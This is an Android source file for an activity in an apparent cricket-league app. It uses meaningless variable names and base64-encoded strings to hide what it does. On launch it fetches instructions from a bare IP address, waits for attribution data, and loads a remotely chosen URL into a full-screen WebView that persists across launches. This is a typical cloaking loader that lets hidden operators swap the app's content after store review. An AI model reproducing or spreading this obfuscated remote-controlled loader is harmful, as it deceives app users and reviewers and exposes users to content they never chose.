package com.league.krikett;

import static com.league.krikett.set.ApFbCL.eqeqds;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.league.krikett.set.ApFbCL;
import com.league.krikett.set.WebSettingCL;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class CL extends AppCompatActivity {

    public  static  WebView webViewCL;
    public static String ghddh;
    public static String iuygc;
    public static String yvdah;
    public static String ytfshs;
    public static String ugsf;


    public static ValueCallback<Uri> uytf;
    public static Uri ytfca = null;
    public static ValueCallback<Uri[]> uytvna;
    public static String ytfsa;
    public static final int trfa = 1;

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != trfa || uytvna == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (ytfsa != null) {
                    results = new Uri[]{Uri.parse(ytfsa)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        uytvna.onReceiveValue(results);
        uytvna = null;
        if (uytf == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? ytfca : data.getData();
            }
        } catch (Exception e) {
        }
        uytf.onReceiveValue(result);
        uytf = null;
    }


    String urlCon = "aHR0cDovLzc4LjE0MC4xMjkuMTkzL2NyaWNrZXRsZWFndWUuanNvbg==";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.cl);
        webViewCL = findViewById(R.id.webViewCL);
        WebSettingCL.webSettingCL(this, webViewCL);
        ApFbCL.cl = this;

        if (ApplicationCL.onl) {

            yvdah = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(WebSettingCL.decodeCl("c2F2ZWRVcmw="), WebSettingCL.decodeCl("bnVsbA=="));
            if (yvdah.equals(WebSettingCL.decodeCl("bnVsbA=="))) {


                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {

                            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(WebSettingCL.decodeCl(urlCon)).openConnection();
                            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                            ytfshs = bufferedReader.readLine();
                            ugsf = bufferedReader.readLine();
                            iuygc = bufferedReader.readLine();
                            ghddh = bufferedReader.readLine();

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    ApFbCL.dipCl();

                                    new CountDownTimer(20000,1000){

                                        @Override
                                        public void onTick(long l) {

                                            if (!ApFbCL.zcxxa.equals("-") || !eqeqds.equals("-")) {
                                                cancel();
                                                ApFbCL.startWeCl(ugsf, ytfshs);
                                            } else {

                                            }
                                        }

                                        @Override
                                        public void onFinish() {
                                            ApFbCL.startWeCl(ugsf, ytfshs);
                                        }
                                    }.start();
                                }
                            });


                        } catch (Exception e) {
                            Toast toast = Toast.makeText(getApplicationContext(),
                                    WebSettingCL.decodeCl("Q29ubmVjdCB0byB0aGUgSW50ZXJuZXQh"), Toast.LENGTH_LONG);
                            toast.show();
                            new Handler().postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    startActivity(new Intent(getApplicationContext(), CL.class));
                                }
                            }, 2000);
                        }

                    }
                }).start();
            } else {
                webViewCL.setVisibility(View.VISIBLE);
                webViewCL.loadUrl(yvdah);
            }


        } else {
            Toast toast = Toast.makeText(getApplicationContext(),
                    WebSettingCL.decodeCl("Q29ubmVjdCB0byB0aGUgSW50ZXJuZXQh"), Toast.LENGTH_LONG);
            toast.show();
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    startActivity(new Intent(getApplicationContext(), CL.class));
                }
            }, 2000);
        }


    }

    @Override
    public void onBackPressed() {
        if (webViewCL.isFocused() && webViewCL.canGoBack()) {
            webViewCL.goBack();
        }
    }
}
